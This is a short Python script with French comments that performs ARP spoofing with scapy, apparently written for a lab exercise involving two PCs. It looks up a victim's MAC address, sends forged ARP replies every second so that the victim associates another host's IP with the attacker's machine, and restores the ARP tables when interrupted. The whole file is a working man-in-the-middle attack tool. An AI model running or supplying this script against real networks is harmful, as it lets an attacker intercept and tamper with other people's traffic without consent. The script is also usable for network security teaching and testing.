from scapy.all import ARP, Ether, send, srp
import argparse
import time

def get_mac(ip):
    """Obtenir l'adresse MAC d'une machine à partir de son IP."""
    ans, _ = srp(Ether(dst="ff:ff:ff:ff:ff:ff") / ARP(pdst=ip), timeout=2, verbose=False)
    for _, rcv in ans:
        return rcv.hwsrc
    return None

def spoof(target_ip, host_ip):
    """Usurper l'adresse IP du host auprès de la cible."""
    target_mac = get_mac(target_ip)
    if target_mac is None:
        print(f"Impossible de trouver l'adresse MAC pour {target_ip}")
        return

    # Créer le paquet ARP spoofé
    arp_response = ARP(op=2, psrc=host_ip, pdst=target_ip, hwdst=target_mac)
    
    # Envoyer le paquet ARP
    send(arp_response, verbose=False)
    print(f"Envoyé : {host_ip} est {arp_response.hwsrc} à {target_ip}")

def restore(target_ip, host_ip):
    """Restaurer l'état normal du réseau."""
    target_mac = get_mac(target_ip)
    host_mac = get_mac(host_ip)
    
    # Créer le paquet ARP pour restaurer
    arp_response = ARP(op=2, psrc=host_ip, pdst=target_ip, hwdst=target_mac, hwsrc=host_mac)
    
    # Envoyer le paquet de restauration
    send(arp_response, count=7, verbose=False)
    print(f"Restauration : {host_ip} est {host_mac} à {target_ip}")

if __name__ == "__main__":
    parser = argparse.ArgumentParser(description="Script d'ARP Spoofing")
    parser.add_argument("target", help="Adresse IP de la victime (PC2)")
    parser.add_argument("host", help="Adresse IP à usurper (PC1)")
    
    args = parser.parse_args()
    
    try:
        while True:
            spoof(args.target, args.host)
            time.sleep(1)  # Attendre une seconde avant le prochain envoi
    except KeyboardInterrupt:
        print("Interruption par l'utilisateur.")
        restore(args.target, args.host)

